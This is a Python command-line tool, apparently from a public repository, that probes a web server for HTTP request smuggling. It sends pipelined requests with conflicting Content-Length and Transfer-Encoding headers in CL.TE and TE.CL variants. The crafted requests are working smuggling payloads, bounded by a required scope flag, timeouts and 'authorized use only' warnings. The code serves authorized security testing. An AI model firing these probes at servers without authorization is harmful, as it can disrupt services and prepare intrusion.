#!/usr/bin/env python3
"""
Smuggler — HTTP request-smuggling parser diagnostics
Bounded CL.TE and TE.CL parser diagnostics for explicitly authorized scope.
Author: Omar Khalid (amooryx) | github.com/amooryx/smuggler
AUTHORIZED USE ONLY — for authorized security testing and bug bounty.
"""

import argparse
import json
import socket
import ssl
import time

DEFAULT_TIMEOUT = 2.0
MAX_TIMEOUT = 5.0
MAX_RESPONSE_BYTES = 8192


def send_raw(host: str, port: int, data: bytes, ssl_ctx=None,
             timeout: float = DEFAULT_TIMEOUT) -> tuple[bytes, str | None]:
    """Send one bounded raw exchange and return response bytes plus any error."""
    response = bytearray()
    connection = None
    deadline = time.monotonic() + timeout
    try:
        connection = socket.create_connection((host, port), timeout=timeout)
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return bytes(response), "operation timed out"
        connection.settimeout(remaining)
        if ssl_ctx:
            connection = ssl_ctx.wrap_socket(connection, server_hostname=host)
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return bytes(response), "operation timed out"
        connection.settimeout(remaining)
        connection.sendall(data)
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return bytes(response), "operation timed out"
            if len(response) >= MAX_RESPONSE_BYTES:
                return bytes(response), "response exceeded 8192-byte limit"
            connection.settimeout(remaining)
            chunk = connection.recv(min(4096, MAX_RESPONSE_BYTES - len(response)))
            if not chunk:
                break
            response.extend(chunk)
        return bytes(response), None
    except (OSError, ssl.SSLError) as ex:
        return bytes(response), f"{type(ex).__name__}: {ex}"
    finally:
        if connection is not None:
            connection.close()


def parser_observation(response: bytes) -> str:
    """Describe response evidence without treating it as vulnerability confirmation."""
    response_text = response.decode(errors="replace")
    if "GPOST" in response_text:
        return "unexpected_method_token_in_response"
    status_line = response_text.split("\r\n", 1)[0]
    if status_line.startswith("HTTP/") and any(
        f" {status} " in status_line for status in ("400", "405")
    ):
        return "http_error_status"
    return "no_obvious_parser_signal"


def make_ssl_context(use_ssl: bool):
    return ssl.create_default_context() if use_ssl else None


def probe_result(technique: str, response: bytes, error: str | None,
                 elapsed: float) -> dict:
    observation = parser_observation(response)
    return {
        "technique": technique,
        "finding": "inconclusive",
        "confirmed_vulnerability": False,
        "parser_observation": observation,
        "elapsed": round(elapsed, 2),
        "response_snippet": response.decode(errors="replace")[:200],
        "error": error,
        "note": "Response evidence is a parser observation, not vulnerability confirmation",
    }

# ─── CL.TE probe ──────────────────────────────────────────────────────────────
def cl_te_probe(host: str, port: int, path: str, use_ssl: bool, timeout: float) -> dict:
    """
    CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding.
    We send a request where CL says body is 4 bytes but TE body leaves 'G' in the pipe.
    A response to the follow-up is only a parser observation, not confirmation.
    """
    req1 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    ).encode()

    req2 = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    ssl_ctx = make_ssl_context(use_ssl)
    start = time.monotonic()
    response, error = send_raw(host, port, req1 + req2, ssl_ctx, timeout)
    return probe_result("CL.TE", response, error, time.monotonic() - start)

# ─── TE.CL probe ──────────────────────────────────────────────────────────────
def te_cl_probe(host: str, port: int, path: str, use_ssl: bool, timeout: float) -> dict:
    """
    TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length.
    The extra bytes after the terminating chunk are treated as a new request body by the back-end.
    """
    body = "0\r\n\r\nG"
    req1 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()

    req2 = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    ssl_ctx = make_ssl_context(use_ssl)
    start = time.monotonic()
    response, error = send_raw(host, port, req1 + req2, ssl_ctx, timeout)
    return probe_result("TE.CL", response, error, time.monotonic() - start)


def authority_for(host: str, port: int) -> str:
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{host}:{port}"


def main():
    parser = argparse.ArgumentParser(
        description="Smuggler - bounded HTTP parser diagnostics (authorized scope only)",
    )
    parser.add_argument("host",        help="Target host")
    parser.add_argument("--port",      type=int, default=443, help="Target port")
    parser.add_argument("--path",      default="/", help="URL path to test")
    parser.add_argument("--scope", required=True,
                        help="Explicit authorized host:port scope; must exactly match target")
    parser.add_argument("--no-ssl",    action="store_true", help="Disable SSL")
    parser.add_argument("--timeout",   type=float, default=DEFAULT_TIMEOUT,
                        help=f"Total exchange timeout in seconds (0.1-{MAX_TIMEOUT:g}; default {DEFAULT_TIMEOUT:g})")
    parser.add_argument("--out",       help="Output JSON file")
    args = parser.parse_args()

    if args.port < 1 or args.port > 65535:
        parser.error("--port must be between 1 and 65535")
    if not 0.1 <= args.timeout <= MAX_TIMEOUT:
        parser.error(f"--timeout must be between 0.1 and {MAX_TIMEOUT:g} seconds")
    if not args.path.startswith("/") or any(
        ord(char) < 0x20 or ord(char) == 0x7f for char in args.path
    ):
        parser.error("--path must start with / and must not contain control characters")
    if any(ord(char) < 0x21 or ord(char) == 0x7f for char in args.host) or any(
        char in args.host for char in "/?#@"
    ):
        parser.error("host must be a hostname or IP address without URL components")
    expected_scope = authority_for(args.host, args.port)
    if args.scope != expected_scope:
        parser.error(f"--scope must exactly match target authority {expected_scope!r}")

    use_ssl = not args.no_ssl
    print(f"[*] HTTP parser diagnostics: {expected_scope}{args.path} (ssl={use_ssl})")
    print("[!] AUTHORIZED USE ONLY")
    print("[!] Each technique sends two pipelined requests and may disrupt the scoped service")

    results = []

    print("[*] Testing CL.TE ...")
    cl_te = cl_te_probe(args.host, args.port, args.path, use_ssl, args.timeout)
    results.append(cl_te)
    print(f"  [?] CL.TE: {cl_te['parser_observation']} (inconclusive; {cl_te['elapsed']}s)")
    if cl_te["error"]:
        print(f"  [!] CL.TE transport error: {cl_te['error']}")

    print("[*] Testing TE.CL ...")
    te_cl = te_cl_probe(args.host, args.port, args.path, use_ssl, args.timeout)
    results.append(te_cl)
    print(f"  [?] TE.CL: {te_cl['parser_observation']} (inconclusive; {te_cl['elapsed']}s)")
    if te_cl["error"]:
        print(f"  [!] TE.CL transport error: {te_cl['error']}")

    if args.out:
        with open(args.out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
